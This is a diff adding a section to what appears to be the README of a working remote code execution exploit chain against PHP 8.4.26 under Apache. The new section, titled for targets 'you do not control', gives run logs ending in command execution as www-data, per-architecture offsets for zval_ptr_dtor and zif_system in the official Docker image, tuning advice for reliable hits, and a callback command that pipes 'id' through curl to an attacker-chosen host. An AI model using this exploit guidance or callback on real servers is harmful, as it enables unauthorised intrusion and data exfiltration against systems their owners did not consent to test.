@@ -141,6 +141,59 @@ hsv in one process), `b_tail_live.gdb` / `b_dtor_tag.gdb` (what the disclosure e
 `libphp - chunk` is not a usable constant). They need no debug build: the official image's symbol table
 is enough for `&ps_globals`, `&alloc_globals`, `&zval_ptr_dtor` and `&zif_system`.
 
+## Against a remote target you do not control
+
+Every stage of the chain is pure HTTP, so the exploit half runs against a remote host. The wrapper does
+not: `chain.sh` verifies two things by reaching into the container, and that access is what a remote
+target lacks. Measured on 2026-10-29 by pointing `chain.sh` at a live target with `--container` set to a
+name that does not exist.
+
+What still works, end to end, with the stages driven by hand:
+
+```
+A1    attempt 1 sid=00 body=1060211 -> 500  211 B
+B1    Set-Cookie: 1679448 chars
+addrs MAIN=0x7fff27e00000 S=0x7fff27ef8398 ZIF=0x7fff263fcd70
+A2    body=279369 -> 500
+B2    response=0        <- the connection dropped, i.e. the fire landed
+      /tmp/c.txt: uid=33(www-data) gid=33(www-data)
+```
+
+Four things have to be supplied or accepted:
+
+| what | why it breaks remotely |
+| --- | --- |
+| **symbols** | `chain.sh` reads them with `docker exec … nm`; without that it falls back to the **arm64** 8.4.26 offsets. On an x86-64 host those are wrong and B2 misses. Pass `--symbols` — official-image values below |
+| **the gate** | A1 answers `500` with a 211-byte body and `display_errors=Off` hides the text, so the only evidence of the 4096 refusal is the container log. The gate prints `not armed: A1 completed without an OOM` and exits `2` |
+| **`--allow-unverified`** | does not help: that path only opens when A1 *drops the connection* (`sockerr`). A1 completes with a 500, so the flag changes nothing |
+| **the proof** | read with `docker exec` / `docker cp`; neither exists remotely |
+
+Official-image offsets, measured on both architectures (valid only if the target runs the same image):
+
+| arch | `zval_ptr_dtor` | `zif_system` | `zend_hash_destroy` |
+| --- | --- | --- | --- |
+| x86-64 | `0x65EB60` | `0x465370` | `0x6138F0` |
+| arm64 | `0x638120` | `0x42CD70` | `0x5EEFC8` |
+
+A distro package is a different binary and needs its own `nm` pass over `libphp.so` (section 8.2 of
+[VD_REENTRY_FULL.md](VD_REENTRY_FULL.md)).
+
+**Getting the proof out.** Writing it into the docroot is the obvious channel and it works on a normal
+host, but not in this lab: `lab/start_target.sh` mounts `-v …/www:/var/www/html:ro`, so a redirect there
+fails with `Read-only file system` and the file never appears. Measured, and it cost a false negative
+before the mount was noticed. Alternatives that need no target-shell: a callback
+(`--cmd 'id | curl -s -d @- http://<your-host>:<port>/'` — the image ships `curl` but no `wget`, `nc` or
+`busybox`), or writing to any path the VServer serves and is not mounted read-only.
+
+**Expected success rate on a freshly built host.** A default `docker run php:8.4.26-apache` keeps
+`MaxRequestWorkers 150`. The pinned multi-worker configuration measured 3/3 on arm64 and **1/3** on
+x86-64, so a first attempt on a default host is a coin toss that says nothing about the target. For a
+deterministic run, set `MaxRequestWorkers 1`.
+
+Not implemented: a `--skip-gate` flag and a `--proof-url` reader. Both would make the remote run a single
+command at the cost of stating, in the output, that arming is unverified — until then the stages have to
+be driven by hand for a remote target.
+
 ## Limits
 
 The chain runs on one measured configuration: `php:8.4.26-apache`, prefork mod_php, one worker, no proxy
